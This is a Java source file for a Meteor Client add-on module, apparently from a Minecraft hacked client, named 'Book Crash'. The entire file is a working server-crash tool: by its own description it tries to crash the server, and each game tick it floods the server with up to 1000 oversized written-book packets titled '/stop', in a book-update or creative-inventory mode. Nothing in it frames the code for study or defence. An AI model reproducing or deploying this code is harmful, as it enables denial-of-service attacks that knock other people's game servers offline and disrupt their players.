package im.hira.tweaks.modules.Crash;

import im.hira.tweaks.MCM4MC;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.orbit.EventHandler;

import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;

import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.WrittenBookContentComponent;
import net.minecraft.text.Text;
import net.minecraft.text.RawFilteredPair;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;

public class BookCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode")
        .description("Which type of packet to send.")
        .defaultValue(Mode.BookUpdate)
        .build()
    );

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send to the server per tick.")
        .defaultValue(100)
        .min(1)
        .sliderMax(1000)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build()
    );

    public BookCrash() {
        super(MCM4MC.JH_CRASH_CAT,"Book Crash", "Tries to crash the server by sending bad book sign packets.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (Utils.canUpdate()) {
            for (int i = 0; i < amount.get(); i++) sendBadBook();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    private void sendBadBook() {
        String title = "/stop";
        String author = "System";

        // Create pages as RawFilteredPair<Text>
        List<RawFilteredPair<Text>> pages = new ArrayList<>();
        for (int i = 0; i < 50; i++) {
            pages.add(RawFilteredPair.of(Text.literal("Page " + i + " " + "A".repeat(800))));
        }

        // Create WrittenBookContentComponent
        WrittenBookContentComponent content = new WrittenBookContentComponent(
            RawFilteredPair.of(title),     // title
            author,                        // author
            0,                             // generation (0 means original)
            pages,                        // pages
            false                        // resolved
        );

        // Create book stack and set component
        ItemStack book = new ItemStack(Items.WRITTEN_BOOK);
        book.set(DataComponentTypes.WRITTEN_BOOK_CONTENT, content);

        int slot = mc.player.getInventory().getSelectedSlot();

        switch (mode.get()) {
            case BookUpdate -> {
                // convert pages to Strings for BookUpdate packet
                List<String> pageStrings = new ArrayList<>();
                for (RawFilteredPair<Text> page : pages) {
                    pageStrings.add(page.raw().getString());
                }

                mc.player.networkHandler.sendPacket(new BookUpdateC2SPacket(
                    slot,
                    pageStrings,
                    Optional.of(title)
                ));
            }
            case Creative -> {
                mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(
                    36 + slot,
                    book
                ));
            }
        }
    }

    public enum Mode {
        BookUpdate,
        Creative
    }
}
